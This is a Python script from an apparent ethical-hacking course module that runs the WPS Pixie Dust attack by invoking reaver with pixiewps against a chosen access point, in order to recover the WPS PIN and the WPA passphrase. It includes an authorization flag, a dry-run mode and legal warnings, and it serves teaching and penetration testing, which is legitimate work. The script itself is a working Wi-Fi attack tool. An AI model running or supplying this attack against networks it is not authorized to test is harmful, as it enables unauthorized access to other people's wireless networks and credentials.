#!/usr/bin/env python3
"""
04_attacks/08_wps_pixiedust.py — The WPS Pixie Dust attack (the other half of 12_wps_scanner).

⚠  THIS IS AN ACTIVE ATTACK TOOL. It associates with the AP and runs the WPS
   exchange against it. Use ONLY on networks you own or are authorized to test.
   In Portugal: Lei 109/2009, Art. 7 — unauthorized access → up to 3 years.

05_defense/02_wps_scanner.py finds WPS-enabled APs and *rates* their risk. This is the
exploit it warns about. Pixie Dust (Dominique Bongard, 2014) recovers the WPS
PIN offline: on many chipsets the registrar's nonces E-S1/E-S2 come from a weak
or zeroed PRNG, so after capturing the M1–M3 WPS messages once, the PIN — and
therefore the WPA passphrase — can be brute-forced in seconds, no online
guessing needed.

Doing the crypto by hand is a lab in itself; in practice the attack is reaver
(-K 1) driving pixiewps. This script is an honest wrapper: it checks the tools
exist, explains what's about to happen, and runs the canonical command — much
like 04_attacks/05_evil_twin.py generates the config rather than pretending to be hostapd.

Usage:
    sudo python3 04_attacks/08_wps_pixiedust.py --iface wlan1mon \\
        --bssid AA:BB:CC:DD:EE:FF --channel 6 --i-have-authorization
    sudo python3 04_attacks/08_wps_pixiedust.py --iface wlan1mon \\
        --bssid AA:BB:CC:DD:EE:FF --channel 6 --dry-run

Requires: reaver (+ pixiewps).  sudo apt install reaver pixiewps

CYBERS3C — Ethical Hacking Postgrad — Wi-Fi Module — Session 3
"""

import argparse
import shutil
import subprocess
import sys

# --- make wifi_utils (repo root) importable from any topic subfolder ---
import os, sys
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from wifi_utils import require_root, require_monitor_mode, add_iface_arg, validate_mac


def build_command(iface: str, bssid: str, channel: int) -> list[str]:
    # -K 1 → Pixie Dust mode (reaver invokes pixiewps automatically)
    # -vv  → verbose so students can watch M1..M3 and the offline crack
    return ["reaver", "-i", iface, "-b", bssid, "-c", str(channel), "-K", "1", "-vv"]


def main():
    parser = argparse.ArgumentParser(
        description="Run a WPS Pixie Dust attack (reaver -K 1) against an authorized AP.",
    )
    add_iface_arg(parser)
    parser.add_argument("--bssid", required=True, metavar="AA:BB:CC:DD:EE:FF",
                        help="Target AP BSSID (must be WPS-enabled).")
    parser.add_argument("--channel", type=int, required=True, metavar="N",
                        help="Channel the target AP is on.")
    parser.add_argument("--dry-run", action="store_true",
                        help="Print the command and exit — run nothing.")
    parser.add_argument("--i-have-authorization", action="store_true",
                        help="Required to actually launch the attack.")
    args = parser.parse_args()

    try:
        bssid = validate_mac(args.bssid)
    except ValueError as e:
        print(f"[!] {e}")
        sys.exit(1)

    cmd = build_command(args.iface, bssid, args.channel)
    print(f"\n=== 04_attacks/08_wps_pixiedust.py ===")
    print(f"[*] Target : {bssid} on channel {args.channel}")
    print(f"[*] Command: {' '.join(cmd)}\n")

    if args.dry_run:
        print("[*] --dry-run: not executing. Confirm with 05_defense/02_wps_scanner.py that")
        print("    this AP is WPS-enabled and not locked before you try for real.")
        return

    if not args.i_have_authorization:
        print("[!] This launches a live WPS attack. Pass --i-have-authorization")
        print("    to confirm you own or are authorized to test this AP.")
        print("    (Or use --dry-run just to see the command.)")
        sys.exit(1)

    if not shutil.which("reaver"):
        print("[!] reaver not found. Install it:  sudo apt install reaver pixiewps")
        sys.exit(1)
    if not shutil.which("pixiewps"):
        print("[!] pixiewps not found — Pixie Dust needs it. sudo apt install pixiewps")
        sys.exit(1)

    require_root("04_attacks/08_wps_pixiedust.py")
    require_monitor_mode(args.iface)

    print("[*] Launching reaver in Pixie Dust mode. Ctrl-C to stop.\n")
    try:
        subprocess.run(cmd)
    except KeyboardInterrupt:
        print("\n[!] Stopped.")
    except FileNotFoundError:
        print("[!] Could not execute reaver.")
        sys.exit(1)


if __name__ == "__main__":
    main()
